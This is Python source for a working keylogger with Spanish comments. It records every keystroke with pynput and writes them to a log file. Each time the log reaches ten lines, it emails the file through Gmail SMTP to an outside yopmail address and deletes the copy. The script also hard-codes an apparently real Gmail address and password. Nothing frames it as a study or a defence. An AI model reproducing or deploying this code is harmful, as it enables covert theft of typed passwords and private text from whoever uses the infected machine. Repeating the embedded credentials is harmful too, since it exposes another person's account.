import logging
import smtplib
import getpass
import os
import shutil
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from os import remove



def enviarCorreo():
    user = "nicodg.papu@gmail.com"
    password = "1478963nicolas"

#Para las cabeceras del email
    remitente = "nicodg.papu@gmail.com"
    destinatario = "quegonohpkey@yopmail.com"
    asunto = "KeyLogger TXT"
    mensaje = "<h1>hola</h1>"
    archivo = 'key_log_copy.txt'

#Host y puerto SMTP de Gmail
    gmail = smtplib.SMTP('smtp.gmail.com', 587)

#protocolo de cifrado de datos utilizado por gmail
    gmail.starttls()

#Credenciales
    gmail.login(user, password)

#muestra la depuración de la operacion de envío 1=true
    gmail.set_debuglevel(1)

    header = MIMEMultipart()
    header['Subject'] = asunto
    header['From'] = remitente
    header['To'] = destinatario

    mensaje = MIMEText(mensaje, 'html')  # Content-type:text/html
    header.attach(mensaje)

    if (os.path.isfile(archivo)):
        adjunto = MIMEBase('application', 'octet-stream')
        adjunto.set_payload(open(archivo, "rb").read())
        encode_base64(adjunto)
        adjunto.add_header('Content-Disposition',
                            'attachment; filename="%s"' % os.path.basename(archivo))
        header.attach(adjunto)

    #Enviar email
    gmail.sendmail(remitente, destinatario, header.as_string())

    #Cerrar la conexión SMTP
    gmail.quit()



log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    shutil.copy("key_log.txt", "key_log_copy.txt")
    fichero = open('key_log_copy.txt', 'r')
    numLineas = (len(fichero.readlines())) 
    fichero.close()

    if numLineas >=10:
        enviarCorreo()
        remove("key_log_copy.txt")
    else:
        print("Aun no")
            


with Listener(on_press=on_press) as listener:
    listener.join()
    
    
